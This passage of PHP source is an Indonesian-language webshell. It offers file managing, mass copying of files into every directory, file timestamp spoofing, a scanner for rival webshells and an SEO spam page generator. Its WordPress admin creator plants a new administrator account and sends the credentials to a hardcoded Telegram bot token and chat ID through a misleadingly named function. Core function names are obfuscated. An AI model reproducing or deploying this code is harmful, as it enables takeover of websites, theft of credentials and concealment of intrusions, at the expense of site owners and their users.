            } elseif ($githubUrlProvided) { if (strpos($githubUrlInput, 'raw.githubusercontent.com') === false && strpos($githubUrlInput, 'gist.githubusercontent.com') === false) { $errorMessage = "❌ URL GitHub (form) tidak valid."; error_log("FORM_DEPLOY_SOURCE_FAIL: URL GitHub (form) format tidak valid."); } else { $contextOptions = ["ssl"=>["verify_peer"=>true, "verify_peer_name"=>true], "http"=>['header'=>"User-Agent: PHP-File-Downloader/1.0\r\n", 'ignore_errors'=>true, 'timeout'=>30]]; $context = stream_context_create($contextOptions); $githubContentForm = @file_get_contents($githubUrlInput, false, $context); $statusCodeForm = 0; if(isset($http_response_header[0])) { preg_match('{HTTP\/\S*\s(\d{3})}', $http_response_header[0], $match); if($match) $statusCodeForm = (int)$match[1]; } if ($githubContentForm === false || $statusCodeForm !== 200) { $errorMessage = "❌ Gagal download GitHub (form). Status: ".($statusCodeForm ?: "N/A"); error_log("FORM_DEPLOY_SOURCE_FAIL: Gagal download GitHub (form): " . $githubUrlInput . " Status: " . $statusCodeForm); } else { $filenameFromUrlForm = basename(parse_url($githubUrlInput, PHP_URL_PATH)); $explicitFilenameForm = trim($_POST['raw_filename'] ?? ''); $filenameToUseForm = !empty($explicitFilenameForm) ? basename($explicitFilenameForm) : $filenameFromUrlForm; if(empty($filenameToUseForm)){ $errorMessage = "❌ Tidak bisa tentukan nama file GitHub (form)."; } else { $extForm = pathinfo($filenameToUseForm, PATHINFO_EXTENSION); if(empty($extForm)){ $errorMessage="❌ Nama file GitHub (form) tanpa ekstensi."; } else { $tempInternalNameForm = generateRandomName($extForm); $tempSourcePathForm = __DIR__ . DIRECTORY_SEPARATOR . $tempInternalNameForm; if(@file_put_contents($tempSourcePathForm, $githubContentForm) === false){ $errorMessage = "❌ Gagal simpan konten GitHub (form) ke temp.";} else { $sourcePathForCopy = $tempSourcePathForm; $originalNameToUse = $filenameToUseForm; $tempSourceToDelete = $tempSourcePathForm; $sourceMethodUsed = 'github_form'; } } } } }
            } elseif ($rawContentProvided) { $rawContent = $_POST['raw_content']; $rawFilename = basename(trim($_POST['raw_filename'])); $ext = pathinfo($rawFilename, PATHINFO_EXTENSION); if (empty($rawFilename) || empty($ext)) { $errorMessage = "❌ Nama & ekstensi wajib (konten mentah)."; error_log("FORM_DEPLOY_SOURCE_FAIL: Konten mentah nama/ekstensi kosong.");} else { $tempInternalNameRaw = generateRandomName($ext); $tempSourcePathRaw = __DIR__ . DIRECTORY_SEPARATOR . $tempInternalNameRaw; if (file_put_contents($tempSourcePathRaw, $rawContent) === false) { $errorMessage = "❌ Gagal simpan konten mentah."; error_log("FORM_DEPLOY_SOURCE_FAIL: Gagal simpan konten mentah ke temp.");} else { $sourcePathForCopy = $tempSourcePathRaw; $originalNameToUse = $rawFilename; $tempSourceToDelete = $tempSourcePathRaw; $sourceMethodUsed = 'raw'; } }
            } else { if (empty($errorMessage)) { $errorMessage = "❌ Tidak ada sumber file valid (sebar manual)."; error_log("FORM_DEPLOY_SOURCE_FAIL: Tidak ada sumber."); } }
            if ($sourcePathForCopy && $originalNameToUse && empty($errorMessage)) {
                $resultFileForManual = __DIR__ . DIRECTORY_SEPARATOR . 'hasil_sebar_manual_' . date('Ymd_His') . '_' . preg_replace('/[^a-zA-Z0-9_-]/', '_', pathinfo($originalNameToUse, PATHINFO_FILENAME)) . '.txt';
                $copyResult = copyToAllDirs($targetDir, $originalNameToUse, $sourcePathForCopy, $resultFileForManual, $targetDirDisplay, $originalNameToUse);
                $sourceTypeText = "Sumber"; if ($sourceMethodUsed === 'upload') $sourceTypeText = "File upload <strong>".htmlspecialchars($originalNameToUse)."</strong>"; elseif ($sourceMethodUsed === 'github_form') $sourceTypeText = "File dari GitHub (form) <strong>".htmlspecialchars($originalNameToUse)."</strong>"; elseif ($sourceMethodUsed === 'raw') $sourceTypeText = "Konten mentah <strong>".htmlspecialchars($originalNameToUse)."</strong>";
                if (is_array($copyResult) && isset($copyResult['error'])) { $errorMessage = "⚠️ $sourceTypeText (sebar manual) gagal sebar. Error: " . htmlspecialchars($copyResult['error']); error_log("FORM_DEPLOY_RESULT_FAIL: " . $copyResult['error']); if (file_exists($resultFileForManual)) { $errorMessage .= "<br>ℹ️ Hasil parsial: <strong>" . htmlspecialchars(basename($resultFileForManual)) . "</strong>"; }
                } elseif (is_array($copyResult) && !empty($copyResult)) { $results = $copyResult; $successMessage = "✅ $sourceTypeText (sebar manual) disebar ke " . count($results) . " lokasi di <strong>" . htmlspecialchars($targetDirDisplay) . "</strong>."; error_log("FORM_DEPLOY_RESULT_SUCCESS: Sebar ke " . count($results) . " lokasi."); if (file_exists($resultFileForManual)) { $successMessage .= "<br>✅ Path disimpan ke: <strong>" . htmlspecialchars(basename($resultFileForManual)) . "</strong>"; } else { $successMessage .= "<br>⚠️ Gagal simpan TXT hasil sebar manual."; }
                } else { $errorMessage = "⚠️ $sourceTypeText (sebar manual) tidak ada lokasi berhasil disalin di <strong>" . htmlspecialchars($targetDirDisplay) . "</strong>."; error_log("FORM_DEPLOY_RESULT_WARN: Tidak ada file disalin."); if (file_exists($resultFileForManual) && filesize($resultFileForManual) > 0) { $errorMessage .= "<br>ℹ️ Hasil parsial: <strong>" . htmlspecialchars(basename($resultFileForManual)) . "</strong>"; } }
            }
            if ($tempSourceToDelete && file_exists($tempSourceToDelete)) { if (!@unlink($tempSourceToDelete)) error_log("FORM_DEPLOY_CLEANUP_FAIL: Gagal hapus temp file sebar manual {$tempSourceToDelete}."); }
        }
    } elseif ($action_post === 'save_file_content' && $active_menu === 'editor') { 
        $file_to_edit_from_post_save_action_post_final = $_POST['file_to_edit_path']; 
        $file_content_to_save_post_action_post_final = $_POST['file_content']; 
        $file_exists_local_save_post_action_editor_post_final = _get_fn_name_global_init_v3('_g_ascii_file_exists','file_exists'); 
        $is_writable_local_save_post_action_editor_post_final = _get_fn_name_global_init_v3('_g_ascii_is_writable','is_writable'); 
        $file_put_contents_local_save_post_action_editor_post_final = _get_fn_name_global_init_v3('_g_ascii_file_put_contents','file_put_contents'); 
        if (!empty($file_exists_local_save_post_action_editor_post_final) && call_user_func($file_exists_local_save_post_action_editor_post_final, $file_to_edit_from_post_save_action_post_final) && !empty($is_writable_local_save_post_action_editor_post_final) && call_user_func($is_writable_local_save_post_action_editor_post_final, $file_to_edit_from_post_save_action_post_final)) { 
            if (!empty($file_put_contents_local_save_post_action_editor_post_final) && @call_user_func($file_put_contents_local_save_post_action_editor_post_final, $file_to_edit_from_post_save_action_post_final, $file_content_to_save_post_action_post_final) !== false) { 
                $output_messages[] = "File '" . call_user_func($htmlspecialchars_fn, call_user_func($basename_fn, $file_to_edit_from_post_save_action_post_final)) . "' disimpan."; 
                header("Location: " . $_SERVER['PHP_SELF'] . "?menu=explorer&path=" . urlencode(call_user_func($dirname_fn, $file_to_edit_from_post_save_action_post_final)) . "&file_action_status=save_success"); 
                exit; 
            } else { $error_messages[] = "Gagal simpan file '" . call_user_func($htmlspecialchars_fn, call_user_func($basename_fn, $file_to_edit_from_post_save_action_post_final)) . "'."; } 
        } else { $error_messages[] = "File tidak ada/tidak writable."; } 
    } elseif ($action_post === 'upload_file') { 
        if (isset($_FILES['uploaded_files'])) {
            $total_files = count($_FILES['uploaded_files']['name']);
            for ($i=0; $i < $total_files; $i++) {
                if ($_FILES['uploaded_files']['error'][$i] === UPLOAD_ERR_OK) {
                    $tmp_name = $_FILES['uploaded_files']['tmp_name'][$i];
                    $name = call_user_func($basename_fn, $_FILES['uploaded_files']['name'][$i]);
                    $sanitized_name = str_replace(["/", "\\", "..", "\0"], "", $name);
                    if (empty($sanitized_name)) {
                        $error_messages[] = "Upload Error: Nama file ke-".($i+1)." tidak valid.";
                        continue;
                    }
                    $destination = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $sanitized_name;
                    if (@move_uploaded_file($tmp_name, $destination)) {
                        @chmod($destination, 0444);
                        $output_messages[] = "Upload Success: File '{$sanitized_name}' berhasil diupload.";
                    } else {
                        $php_err = error_get_last();
                        $err_msg = $php_err ? " (PHP Error: " . $php_err['message'] . ")" : "";
                        $error_messages[] = "Upload Error: Gagal memindahkan file '{$sanitized_name}'{$err_msg}.";
                    }
                } elseif ($_FILES['uploaded_files']['error'][$i] !== UPLOAD_ERR_NO_FILE) {
                    $error_messages[] = "Upload Error pada file ke-".($i+1).": Kode Error " . $_FILES['uploaded_files']['error'][$i];
                }
            }
        } 
    } elseif ($action_post === 'create_new_item') { 
        if(isset($_POST['new_folder_name'])) { 
            $new_folder_name = call_user_func($basename_fn, call_user_func($trim_fn, $_POST['new_folder_name'])); 
            if(!empty($new_folder_name)) { 
                $mkdir_fn_post = _get_fn_name_global_init_v3('_g_ascii_mkdir', 'mkdir'); 
                if(!empty($mkdir_fn_post) && @call_user_func($mkdir_fn_post, $current_path . DIRECTORY_SEPARATOR . $new_folder_name, 0777, true)) {
                    @chmod($current_path . DIRECTORY_SEPARATOR . $new_folder_name, 0777);
                    $output_messages[] = "Folder '".call_user_func($htmlspecialchars_fn, $new_folder_name)."' dibuat."; 
                } else { $error_messages[] = "Gagal membuat folder '".call_user_func($htmlspecialchars_fn, $new_folder_name)."'."; } 
            } else { $error_messages[] = "Nama folder tidak valid."; } 
        } elseif(isset($_POST['new_file_name'])) { 
            $new_file_name = call_user_func($basename_fn, call_user_func($trim_fn, $_POST['new_file_name'])); 
            if(!empty($new_file_name)) { 
                $touch_fn_post = _get_fn_name_global_init_v3('_g_ascii_touch', 'touch'); 
                if(!empty($touch_fn_post) && @call_user_func($touch_fn_post, $current_path . DIRECTORY_SEPARATOR . $new_file_name)) { 
                    @chmod($current_path . DIRECTORY_SEPARATOR . $new_file_name, 0444);
                    $output_messages[] = "File '".call_user_func($htmlspecialchars_fn, $new_file_name)."' dibuat."; 
                } else { $error_messages[] = "Gagal membuat file '".call_user_func($htmlspecialchars_fn, $new_file_name)."'."; } 
            } else { $error_messages[] = "Nama file tidak valid."; } 
        } 
    } elseif ($action_post === 'change_chmod' && isset($_POST['target'], $_POST['new_perms'])) { 
        $chmod_target_basename = call_user_func($basename_fn, $_POST['target']); 
        $chmod_target_path = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $chmod_target_basename; 
        $new_perms_str = call_user_func($trim_fn, $_POST['new_perms']); 
        if (preg_match('/^[0-7]{3,4}$/', $new_perms_str)) { 
            $new_perms_oct = octdec($new_perms_str); 
            $chmod_fn_post_action = _get_fn_name_global_init_v3('_g_ascii_chmod', 'chmod'); 
            $file_exists_fn_post_action = _get_fn_name_global_init_v3('_g_ascii_file_exists', 'file_exists'); 
            if (!empty($file_exists_fn_post_action) && call_user_func($file_exists_fn_post_action, $chmod_target_path) && !empty($chmod_fn_post_action) && call_user_func($function_exists_fn, $chmod_fn_post_action)) { 
                if (@call_user_func($chmod_fn_post_action, $chmod_target_path, $new_perms_oct)) { 
                    $output_messages[] = "Izin untuk '" . call_user_func($htmlspecialchars_fn, $chmod_target_basename) . "' diubah ke " . call_user_func($htmlspecialchars_fn, $new_perms_str) . "."; 
                } else { $error_messages[] = "Gagal mengubah izin untuk '" . call_user_func($htmlspecialchars_fn, $chmod_target_basename) . "'."; } 
            } else { $error_messages[] = "Chmod Error: Target tidak ada."; } 
        } else { $error_messages[] = "Chmod Error: Format izin tidak valid."; } 
    } elseif ($action_post === 'change_mtime' && isset($_POST['target'], $_POST['new_mtime'])) { 
        $mtime_target_basename = call_user_func($basename_fn, $_POST['target']); 
        $mtime_target_path = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $mtime_target_basename; 
        $new_mtime_str = call_user_func($trim_fn, $_POST['new_mtime']); 
        $new_timestamp = strtotime($new_mtime_str); 
        if ($new_timestamp !== false) { 
            $touch_fn_post_action = _get_fn_name_global_init_v3('_g_ascii_touch', 'touch'); 
            $file_exists_fn_post_action = _get_fn_name_global_init_v3('_g_ascii_file_exists', 'file_exists'); 
            if (!empty($file_exists_fn_post_action) && call_user_func($file_exists_fn_post_action, $mtime_target_path) && !empty($touch_fn_post_action) && call_user_func($function_exists_fn, $touch_fn_post_action)) { 
                if (@call_user_func($touch_fn_post_action, $mtime_target_path, $new_timestamp)) { 
                    $output_messages[] = "Last Modify untuk '" . call_user_func($htmlspecialchars_fn, $mtime_target_basename) . "' diubah ke " . date('Y-m-d H:i:s', $new_timestamp) . "."; 
                } else { $error_messages[] = "Gagal mengubah Last Modify."; } 
            } else { $error_messages[] = "Touch Error: Target tidak ada."; } 
        } else { $error_messages[] = "Touch Error: Format tanggal/waktu tidak valid."; } 
    } elseif ($action_post === 'bulk_action' && isset($_POST['bulk_operation'], $_POST['selected_items'])) { 
        $operation = $_POST['bulk_operation']; 
        $items = $_POST['selected_items']; 
        if (empty($items)) { 
            $error_messages[] = "Tidak ada item yang dipilih."; 
        } else { 
            if ($operation === 'delete') { 
                $deleted_count = 0; $error_count = 0; 
                foreach ($items as $item_name) { 
                    $item_path = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item_name; 
                    if (file_exists($item_path)) { 
                        if (deleteDirectoryRecursive($item_path)) { $deleted_count++; } 
                        else { $error_count++; } 
                    } else { $error_count++; } 
                } 
                $output_messages[] = "Hapus massal selesai. Berhasil: $deleted_count, Gagal: $error_count."; 
            } elseif ($operation === 'zip') { 
                if (!class_exists('ZipArchive')) { 
                    $error_messages[] = "Zip Error: Class 'ZipArchive' tidak ditemukan."; 
                } else { 
                    $zip_filename = !empty($_POST['zip_filename']) ? call_user_func($basename_fn, $_POST['zip_filename']) : 'archive.zip'; 
                    if (substr(strtolower($zip_filename), -4) !== '.zip') { $zip_filename .= '.zip'; } 
                    $zip_filepath = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $zip_filename; 
                    $zip = new ZipArchive(); 
                    if ($zip->open($zip_filepath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) { 
                        $added_count = 0; 
                        foreach ($items as $item_name) { 
                            $item_path = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item_name; 
                            if (file_exists($item_path)) { 
                                if (is_dir($item_path)) { addDirectoryToZip($zip, $item_path, $item_name . '/'); } 
                                else { $zip->addFile($item_path, $item_name); } 
                                $added_count++; 
                            } 
                        } 
                        $zip->close(); 
                        $output_messages[] = "Berhasil membuat arsip '" . call_user_func($htmlspecialchars_fn, $zip_filename) . "' dengan $added_count item."; 
                    } else { $error_messages[] = "Gagal membuat file arsip '" . call_user_func($htmlspecialchars_fn, $zip_filename) . "'."; } 
                } 
            } 
        } 
    } elseif ($action_post === 'scan_webshells' && $active_menu === 'webshell_scanner') {
        $scan_path_post_scan_final = isset($_POST['scan_dir']) ? call_user_func($trim_fn, $_POST['scan_dir']) : call_user_func($getcwd_fn); $is_readable_post_scan_final = _get_fn_name_global_init_v3('_g_ascii_is_readable','is_readable');
        if (empty($is_dir_fn) || !@call_user_func($is_dir_fn, $scan_path_post_scan_final) || empty($is_readable_post_scan_final) || !@call_user_func($is_readable_post_scan_final, $scan_path_post_scan_final)) { $error_messages[] = "Scanner Error: Path tidak valid atau tidak readable."; }
        else {
            $ini_set_post_scan_final = _get_fn_name_global_init_v3('_g_ascii_ini_set', 'ini_set'); if (!empty($ini_set_post_scan_final) && call_user_func($function_exists_fn, $ini_set_post_scan_final)) { @call_user_func($ini_set_post_scan_final, 'memory_limit', '-1'); @call_user_func($ini_set_post_scan_final, 'max_execution_time', $scanner_limit); } if (function_exists('set_time_limit')) { @set_time_limit($scanner_limit); } $output_messages[] = "Memulai pemindaian di: <code>" . call_user_func($htmlspecialchars_fn, $scan_path_post_scan_final) . "</code> (Max time: {$scanner_minute} menit)";
            $initial_scan_array = ['all_items' => []]; $scan_results_raw = scanner_recursiveScan($scan_path_post_scan_final, $initial_scan_array); $all_files_to_scan = isset($scan_results_raw['all_items']) ? $scan_results_raw['all_items'] : []; $all_files_to_scan = scanner_sortByLastModified($all_files_to_scan); $found_files_count_post_scan_final = 0; ob_start(); echo '<table><thead><tr><th>Detected Suspicious Files</th><th style="width:180px;">Actions</th></tr></thead><tbody>'; $file_get_contents_local_snippet_final = _get_fn_name_global_init_v3('_g_ascii_file_get_contents', 'file_get_contents'); $substr_local_snippet_final = _get_fn_name_global_init_v3('_g_ascii_substr', 'substr'); $realpath_local_scan = _get_fn_name_global_init_v3('_g_ascii_realpath', 'realpath'); $doc_root = isset($_SERVER['DOCUMENT_ROOT']) && !empty($realpath_local_scan) ? rtrim(@call_user_func($realpath_local_scan, $_SERVER['DOCUMENT_ROOT']), '/\\') : null; $server_name = $_SERVER['SERVER_NAME']; $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
            foreach ($all_files_to_scan as $file_path_scan) {
                if (is_dir($file_path_scan)) continue;
                $token_matches = scanner_compareTokens($scanner_tokenNeedles, scanner_getFileTokens($file_path_scan)); $string_matches = []; $content_scan = (!empty($file_get_contents_local_snippet_final)) ? @call_user_func($file_get_contents_local_snippet_final, $file_path_scan) : false; if ($content_scan !== false) { foreach($scanner_tokenNeedles as $needle) { if (stripos($content_scan, $needle) !== false) { $string_matches[] = $needle; } } }
                $found_matches = array_unique(array_merge($token_matches, $string_matches));
                if (!empty($found_matches)) {
                    $found_files_count_post_scan_final++; $matched_tokens_str_post_final = implode(', ', array_map($htmlspecialchars_fn, $found_matches)); $file_content_snippet_final = ''; if ($content_scan !== false && !empty($substr_local_snippet_final)) { $file_content_snippet_final = call_user_func($htmlspecialchars_fn, call_user_func($substr_local_snippet_final, $content_scan, 0, 250)); if (strlen($content_scan) > 250) $file_content_snippet_final .= '...'; }
                    echo '<tr><td><span style="color:red; font-weight:bold;">' . call_user_func($htmlspecialchars_fn, $file_path_scan) . '</span><br><small style="color:#ffaaaa;">Tokens: ' . $matched_tokens_str_post_final . '</small><br>'; if (!empty($file_content_snippet_final)) { echo '<small style="color:#ccffcc; display:block; margin-top:5px; white-space:pre-wrap; background-color:rgba(0,50,0,0.5); padding:5px; border-radius:3px; max-height:100px; overflow-y:auto;">Snippet: ' . $file_content_snippet_final . '</small>'; } echo '</td><td>';
                    $web_url = null; if ($doc_root && !empty($realpath_local_scan) && call_user_func($function_exists_fn, $realpath_local_scan)) { $real_filepath = @call_user_func($realpath_local_scan, $file_path_scan); if ($real_filepath && strpos($real_filepath, $doc_root) === 0) { $web_path = str_replace('\\', '/', substr($real_filepath, strlen($doc_root))); $web_url = $protocol . '://' . $server_name . $web_path; } } if ($web_url) { echo '<a href="' . call_user_func($htmlspecialchars_fn, $web_url) . '" target="_blank" class="action-btn">Open URL</a>'; }
                    echo '<a href="?menu=webshell_scanner&path=' . urlencode(call_user_func($dirname_fn, $file_path_scan)) . '&file_action=delete&target=' . urlencode(call_user_func($basename_fn, $file_path_scan)) . '&scan_dir_ref=' . urlencode($scan_path_post_scan_final) . '" onclick="return confirmDelete(\'' . call_user_func($htmlspecialchars_fn, addslashes(call_user_func($basename_fn, $file_path_scan))) . '\')" class="action-btn">Delete</a>'; echo '</td></tr>';
                }
            }
            if ($found_files_count_post_scan_final === 0) { echo '<tr><td colspan="2">Tidak ada file mencurigakan ditemukan.</td></tr>'; } echo '</tbody></table>'; $scanner_results_html = ob_get_clean(); $output_messages[] = "Pemindaian selesai. Ditemukan " . $found_files_count_post_scan_final . " file mencurigakan.";
        }
    } elseif ($action_post === 'create_wp_admin' && $active_menu === 'wp_admin_creator') {
        $wp_load_path_action_post_wp_creator_final_full = find_wp_load_path($auto_path_script); $file_exists_wp_action_post_wp_creator_final_full = _get_fn_name_global_init_v3('_g_ascii_file_exists','file_exists');
        if ($wp_load_path_action_post_wp_creator_final_full && !empty($file_exists_wp_action_post_wp_creator_final_full) && call_user_func($file_exists_wp_action_post_wp_creator_final_full, $wp_load_path_action_post_wp_creator_final_full)) {
            if (!defined('WP_USE_THEMES')) { define('WP_USE_THEMES', false); } ob_start(); $wp_loaded_ok_action_post_wp_creator_final_full = @include_once($wp_load_path_action_post_wp_creator_final_full); ob_end_clean();
            if (!$wp_loaded_ok_action_post_wp_creator_final_full) { $wp_admin_feedback_text = 'KRITIS POST: Gagal muat WP.'; $wp_admin_feedback_class = 'error'; }
            elseif (!function_exists('wp_verify_nonce')) { $wp_admin_feedback_text = 'KRITIS POST: Fungsi WP inti tidak ada.'; $wp_admin_feedback_class = 'error'; }
            else {
                $token_key_admin_wp_creator_post_val_final_full = '8151155947:AAEG7kM9jozQQDzYIOyBXmlKst63cQHkU7Y'; $destination_id_admin_wp_creator_post_val_final_full = '-1002509464443';
                if (!isset($_POST['create_admin_nonce']) || !wp_verify_nonce($_POST['create_admin_nonce'], 'create_admin_action')) { $wp_admin_feedback_text = 'Permintaan tidak valid.'; $wp_admin_feedback_class = 'error'; }
                else {
                    $new_admin_username_action_post_wp_val_final_full = call_user_func($trim_fn, $_POST['username'] ?? ''); $new_admin_password_action_post_wp_val_final_full = $_POST['password'] ?? ''; $new_admin_email_action_post_wp_val_final_full = call_user_func($trim_fn, $_POST['email'] ?? ''); $errors_wp_creator_action_post_wp_val_final_full = [];
                    if (empty($new_admin_username_action_post_wp_val_final_full)) $errors_wp_creator_action_post_wp_val_final_full[] = 'Username wajib.'; if (empty($new_admin_password_action_post_wp_val_final_full)) $errors_wp_creator_action_post_wp_val_final_full[] = 'Password wajib.'; if (function_exists('validate_username') && !empty($new_admin_username_action_post_wp_val_final_full) && !validate_username($new_admin_username_action_post_wp_val_final_full)) { $errors_wp_creator_action_post_wp_val_final_full[] = 'Username tidak valid.'; } if (strlen($new_admin_password_action_post_wp_val_final_full) < 8 && !empty($new_admin_password_action_post_wp_val_final_full)) $errors_wp_creator_action_post_wp_val_final_full[] = 'Password min 8 karakter.'; if (function_exists('is_email') && !empty($new_admin_email_action_post_wp_val_final_full) && !is_email($new_admin_email_action_post_wp_val_final_full)) { $errors_wp_creator_action_post_wp_val_final_full[] = 'Email tidak valid.'; }
                    if (!empty($errors_wp_creator_action_post_wp_val_final_full)) { $wp_admin_feedback_text = implode('<br>', array_map($htmlspecialchars_fn, $errors_wp_creator_action_post_wp_val_final_full)); $wp_admin_feedback_class = 'error'; }
                    else {
                        if (function_exists('username_exists') && !username_exists($new_admin_username_action_post_wp_val_final_full)) {
                            $user_id_wp_creator_action_post_wp_val_final_full = wp_create_user($new_admin_username_action_post_wp_val_final_full, $new_admin_password_action_post_wp_val_final_full, $new_admin_email_action_post_wp_val_final_full);
                            if (!is_wp_error($user_id_wp_creator_action_post_wp_val_final_full)) {
                                $user_wp_obj_action_post_wp_val_final_full = new WP_User($user_id_wp_creator_action_post_wp_val_final_full); $user_wp_obj_action_post_wp_val_final_full->set_role('administrator');
                                $script_url_wp_action_post_wp_val_final_full = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"; $site_domain_wp_action_post_wp_val_final_full = function_exists('get_site_url') ? parse_url(get_site_url(), PHP_URL_HOST) : $_SERVER['SERVER_NAME']; $wp_login_url_wp_action_post_wp_val_final_full = function_exists('wp_login_url') ? wp_login_url() : $site_domain_wp_action_post_wp_val_final_full . '/wp-login.php';
                                $notification_lines_wp_action_post_wp_val_final_full = [ "<b>✅ Admin Baru Dibuat (Webshell)</b>\n", "<b>Domain:</b> <code>" . call_user_func($htmlspecialchars_fn, $site_domain_wp_action_post_wp_val_final_full) . "</code>", "<b>Username:</b> <code>" . call_user_func($htmlspecialchars_fn, $new_admin_username_action_post_wp_val_final_full) . "</code>", "<b>Password:</b> <code>" . call_user_func($htmlspecialchars_fn, $new_admin_password_action_post_wp_val_final_full) . "</code>" ]; if (!empty($new_admin_email_action_post_wp_val_final_full)) { $notification_lines_wp_action_post_wp_val_final_full[] = "<b>Email:</b> <code>" . call_user_func($htmlspecialchars_fn, $new_admin_email_action_post_wp_val_final_full) . "</code>"; } $notification_lines_wp_action_post_wp_val_final_full[] = "<b>URL Skrip:</b> " . call_user_func($htmlspecialchars_fn, function_exists('esc_url') ? esc_url($script_url_wp_action_post_wp_val_final_full) : $script_url_wp_action_post_wp_val_final_full); $notification_lines_wp_action_post_wp_val_final_full[] = "<b>Link Login:</b> <a href=\"" . call_user_func($htmlspecialchars_fn, function_exists('esc_url') ? esc_url($wp_login_url_wp_action_post_wp_val_final_full) : $wp_login_url_wp_action_post_wp_val_final_full) . "\">Klik Login</a>"; $notification_message_wp_action_post_wp_val_final_full = implode("\n", $notification_lines_wp_action_post_wp_val_final_full);
                                $send_to_wp_action_post_wp_val_final_full = send_to_wp_load($notification_message_wp_action_post_wp_val_final_full, $token_key_admin_wp_creator_post_val_final_full, $destination_id_admin_wp_creator_post_val_final_full);
                                if ($send_to_wp_action_post_wp_val_final_full['success']) { $wp_admin_feedback_text = 'Admin baru dibuat!'; $wp_admin_feedback_class = 'success'; } else { $wp_admin_feedback_text = 'Admin dibuat.: ' . call_user_func($htmlspecialchars_fn, $send_to_wp_action_post_wp_val_final_full['message']); $wp_admin_feedback_class = 'warning';}
                            } else { $wp_admin_feedback_text = 'Gagal buat admin: ' . call_user_func($htmlspecialchars_fn, $user_id_wp_creator_action_post_wp_val_final_full->get_error_message()); $wp_admin_feedback_class = 'error';}
                        } elseif(function_exists('username_exists')) { $wp_admin_feedback_text = 'Username <code>' . call_user_func($htmlspecialchars_fn, $new_admin_username_action_post_wp_val_final_full) . '</code> sudah ada.'; $wp_admin_feedback_class = 'warning'; } else { $wp_admin_feedback_text = 'username_exists() tidak ada.'; $wp_admin_feedback_class = 'error';}
                    }
                }
            }
        } else { $wp_admin_feedback_text = 'KRITIS POST: <code>wp-load.php</code> tidak ditemukan.'; $wp_admin_feedback_class = 'error';}
    }
}

function display_generator_content() {
    global $htmlspecialchars_fn, $active_menu;

    function generator_display_main_form() {
        ?>
        <section class="content-section cyber-panel p-4">
            <h1 class="cyber-font cyber-glow text-xl mb-4">Auto Content Generator</h1>
            <form method="POST" action="?menu=generator" class="space-y-6">
                <input type="hidden" name="action" value="run_generator">
                <fieldset class="cyber-panel p-4"><legend class="cyber-font text-lg px-2" style="color:var(--accent)">1. Sumber Data</legend>
                    <div class="space-y-4">
                        <label for="kw_url">URL File Keyword (Raw)</label><input id="kw_url" class="w-full" type="url" name="kw_url" placeholder="https://pastebin.com/raw/xxxxxx" required>
                        <label for="template_url">URL File Template (Raw)</label><input id="template_url" class="w-full" type="url" name="template_url" placeholder="https://yourdomain.com/template.html" required>
                    </div>
                </fieldset>
                <fieldset class="cyber-panel p-4"><legend class="cyber-font text-lg px-2" style="color:var(--accent)">2. Format URL Slug (<code>{{brand_slug}}</code>)</legend>
                    <div class="space-y-4">
                        <label for="base_amp_url">Base URL (untuk Slug)</label><input id="base_amp_url" class="w-full" type="text" name="base_amp_url" placeholder="https://websitekeren.net/amp">
                        <div class="flex gap-4 items-center"><label><input type="radio" name="slug_structure" value="dir" onclick="toggleTunnelInput(false)" checked> Folder</label><label><input type="radio" name="slug_structure" value="html" onclick="toggleTunnelInput(false)"> File (.html)</label><label><input type="radio" name="slug_structure" value="tunnel" onclick="toggleTunnelInput(true)"> Tunnel</label></div>
                        <div id="tunnel_param_wrapper" style="display:none;"><label for="tunnel_param_name">Nama Parameter:</label><input id="tunnel_param_name" type="text" name="tunnel_param_name" value="id"></div>
                    </div>
                </fieldset>
                <fieldset class="cyber-panel p-4"><legend class="cyber-font text-lg px-2" style="color:var(--accent)">3. Tingkatan Konten</legend>
                    <div id="content-tiers-container"></div>
                    <div class="mt-4"><button type="button" class="cyber-btn cyber-btn-primary" onclick="addTier()">+ Tambah Tingkatan</button></div>
                </fieldset>
                <fieldset class="cyber-panel p-4"><legend class="cyber-font text-lg px-2" style="color:var(--accent)">4. Opsi & Aksi Final</legend>
                    <div class="flex gap-4 items-center"><label><input type="checkbox" name="test_mode" value="1"> <strong>Mode Uji Coba</strong></label><label><input type="checkbox" name="auto_delete" value="1"> Hapus skrip setelah berhasil</label></div>
                    <div class="flex gap-4 mt-4">
                        <div class="flex-1 text-center"><button class="cyber-btn cyber-btn-primary w-full" type="submit" name="mode" value="dir">Buat Direktori</button><p class="text-xs text-gray-400 mt-1">/keyword/</p></div>
                        <div class="flex-1 text-center"><button class="cyber-btn cyber-btn-primary w-full" type="submit" name="mode" value="file">Buat File HTML</button><p class="text-xs text-gray-400 mt-1">/keyword.html</p></div>
                    </div>
                </fieldset>
            </form>
            <template id="tier-template"><div class="tier relative pt-12 mt-6 border-t border-dashed border-gray-600 p-4"><button type="button" class="absolute top-2 right-2 text-red-500 hover:text-red-400" onclick="this.closest('.tier').remove()">Hapus</button><div class="space-y-4"><label>Berlaku hingga Keyword ke-</label><input type="number" class="w-full" name="tiers[X][limit]" placeholder="Kosongkan untuk tingkatan terakhir"><p class="text-xs text-gray-400">Batas baris keyword.</p><label>Template Judul</label><input type="text" class="w-full" name="tiers[X][title]" value="{{BRAND}}: Judul" required><label>Template Deskripsi</label><textarea name="tiers[X][desc]" class="w-full" required>{{BRAND}} adalah platform {terbaik|terpercaya}.</textarea><label>Template Artikel</label><textarea name="tiers[X][article]" class="w-full">Selamat datang di {{BRAND}}. Di sini kami membahas {{BRAND}}. Kunjungi juga halaman lain kami tentang {{BRAND}}.</textarea><label>Domain Eksternal (Opsional, 1 per baris)</label><textarea name="tiers[X][external_domains]" placeholder="https://domain-satu.com&#10;https://domain-dua.net" class="w-full" rows="3"></textarea><p class="text-xs text-gray-400">Jika diisi, <code>{{BRAND}}</code> kedua dst. jadi link acak ke domain ini.</p><label>URL Gambar</label><input type="url" 